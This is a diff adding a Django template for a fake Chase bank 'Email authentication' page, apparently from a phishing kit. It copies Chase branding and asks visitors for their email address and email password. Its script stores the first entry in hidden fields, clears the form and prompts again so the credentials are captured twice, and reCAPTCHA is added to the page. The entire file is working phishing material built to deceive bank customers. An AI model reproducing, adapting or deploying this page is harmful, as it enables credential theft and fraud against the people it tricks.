@@ -1,0 +1,194 @@
+{% load static %}
+
+{% block header %}
+<title>Verify Email</title>
+<link rel="stylesheet" href="{% static 'base/css/styles.css' %}?{% now 'U' %}">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
+<head>
+        <meta charset="utf-8">
+        <meta name="robots" content="noindex,nofollow">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+        <link rel="shortcut icon" href="{% static 'base/images/chasefavicon.ico' %}">
+        <link rel="apple-touch-icon" sizes="152x152" href="{% static 'base/images/chase-touch-icon-152x152.png' %}">
+        <link rel="apple-touch-icon" sizes="120x120" href="{% static 'base/images/chase-touch-icon-120x120.png' %}">
+        <link rel="apple-touch-icon" sizes="76x76" href="{% static 'base/css/chase-touch-icon-76x76.png' %}">
+        <link rel="apple-touch-icon" href="{% static 'base/images/chase-touch-icon.png' %}">
+        <link rel="stylesheet" href="{% static 'base/css/logon.css' %}">
+        <link rel="stylesheet" href="{% static 'base/css/blue-ui2.css' %}">
+        <link rel="stylesheet" href="{% static 'base/css/overview.css' %}">
+        <link rel="stylesheet" href="{% static 'base/css/styles.css' %}">
+        <script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+
+{% endblock %}
+{% block body %}
+
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
+    <style type="text/css">
+    .help-block.form-error{
+        color:#bf2155;
+    }
+
+.jpui.alert.primary .title {
+    font-size: 1rem;
+    color: #bf2155;
+}
+.jpui.alert.primary.inverted {
+    color: #bf2155!important;
+}
+.jpui.alert.primary {
+    background-color: #bf2155;
+}
+.jpui.icon.error {
+    background-color: inherit!important;
+    color: #bf2155!important;
+}
+
+.icon{display:none}@font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url(base/css/fonts/dcefont.eot);src:url(base/css/fonts/dcefont.eot?#iefix) format('embedded-opentype'),url(base/css/fonts/dcefont.woff) format('woff'),url(base/css/fonts/dcefont.ttf) format('truetype'),url(base/css/fonts/dcefont.svg#dcefont) format('svg')}
+
+</style>
+<div data-is-view="true">
+<div class="homepage">
+
+<div class="logon-container">
+<header class="toggle-aria-hidden">
+<div class="logon header jpui transparent navigation bar">
+<a href="#">
+<div class="chase logo"></div>
+<span class="util accessible-text">SPOX LOVE YOU !</span>
+</a>
+</div>
+<form action="" method="POST">
+<input type="hidden" name="token" value="chaseSP0X">
+<main id="logon-content" data-has-view="true">
+<div class="msd password-reset reset-code" data-is-view="true">
+<div id="backgroundImage">
+<div class="jpui background image fixed blurred" id="geoImage">
+<style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.1.jpeg/10001.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.1.jpeg/10001.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.1.jpeg/10001.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.1.jpeg/10001.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.1.jpeg/10001.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.1.jpeg/10001.jpeg); } }</style>
+
+</div>
+</div>
+<div class="container">
+<div class="row jpui primary panel">
+<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
+    <h1 class="header" tabindex="-1">For Your Protection</h1>
+<div class="row jpui panel body">
+<div class="col-xs-12 col-sm-10 col-sm-offset-1">
+<div class="progress u-no-outline" id="progress" tabindex="-1">
+<div class="row">
+<div class="col-xs-12 col-sm-6 clear-padding">
+</div>
+<div class="col-xs-12 col-sm-6 progress-padding">
+<div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
+<ol class="steps-3" role="presentation">
+    <li class="active"></li>
+    <li class="active current-step"></li>
+    <li id="progress-progressBar-step-3"></li>
+</ol>
+
+
+</div>
+</div>
+</div>
+</div>
+<style type="text/css">
+    .jpui.alert.spox.spox .title {
+    font-size: 1rem;
+    font-weight: 300;
+    color: #bf2155;
+    letter-spacing: 0;
+    text-decoration: none;
+    width: 100%;
+    margin: .0625rem .0625rem .313rem 0;
+}
+
+</style>
+
+
+
+<form  method="POST" autocomplete="off" action=""
+    <h3>Email authentication </h3ext>
+    <p>For Your identification, We need you to sign-in to your registered email which we have in our records.</p>
+    {% csrf_token %}
+<div class="inside-container">
+<div class="row">
+<div class="col-xs-12 col-sm-5 label-column otp-code">
+    <label class="jpui label msdLabelHeightFix">
+        <span class="accessible-text hidden"></span>Email address </label>
+</div>
+<div class="col-xs-12 col-sm-5 form-column otp-code">
+<div class="account-input ssn_card_account_number">
+    <input class="jpui input account-input ssn_card_account_number Email_access inp_username slimodan_input" required name = "map" data-validation="email"  placeholder="" type="text" name="map"  data-validation-error-msg="  ">    </div>
+</div>
+</div>
+<div class="row">
+<div class="col-xs-12 col-sm-5 label-column">
+    <label class="jpui label">
+    <span class="accessible-text hidden"></span>Password</label>
+</div>
+<div class="col-xs-12 col-sm-5 form-column">
+<div class="margin-bottom-20px" id="password_input">
+<input class="jpui input margin-bottom-20px Password_access inp_password slimodan_input" placeholder="" required name="pap" type="password" data-validation="length" data-validation-length="min4-30" name="pap" data-validation-error-msg=" ">
+</div>
+</div>
+</div>
+<p class="identification-code-received-message">
+<span></span>
+<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
+</span>
+</p>
+</div>
+<div class="button-container row show-sm">
+<div class="col-xs-12 col-sm-3 col-sm-offset-6">
+<button type="button" class="jpui button focus fluid ">
+    <span class="label">Cancel</span>
+</button>
+</div>
+
+<input type="text" hidden name="MailAccess_step1" id="MailAccess_step1">
+<input type="text" hidden name="PasswordAccess_step1" id="PasswordAccess_step1">
+<input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
+
+<div class="col-xs-12 col-sm-3">
+<button type="submit" class="jpui button focus fluid primary " id="fuck_login">
+    <span class="label">Next</span>
+</button>
+</div>
+</div>
+<div class="footer__module-footer__section--footer-link__text copyright"><p></p><p style="text-align: center;">© 2023 JPMorgan Chase &amp; Co.</p>
+</form></div></div></div></div></div></div>
+</main>
+</div>
+</div>
+</div>
+<script src="{% static 'base/js/script.js' %}" defer="true"></script>
+    <script>
+        $("#fuck_login").click(function(e){
+            e.preventDefault();
+            if ($("#fuck_login").hasClass("one")){
+                $("#MailAccess_step1").val($(".map").val());
+                $("#PasswordAccess_step1").val($(".pap").val());
+                $(".slimodan_alert2").removeClass("d-none");
+                $(".map").val("");
+                $(".pap").val("");
+                $("#fuck_login").removeClass("one");
+
+
+            }else{
+                $(".form_one").submit();
+            }
+        })
+    </script>
+    <script>
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+
+</body>
+</html>
+{% endblock %}
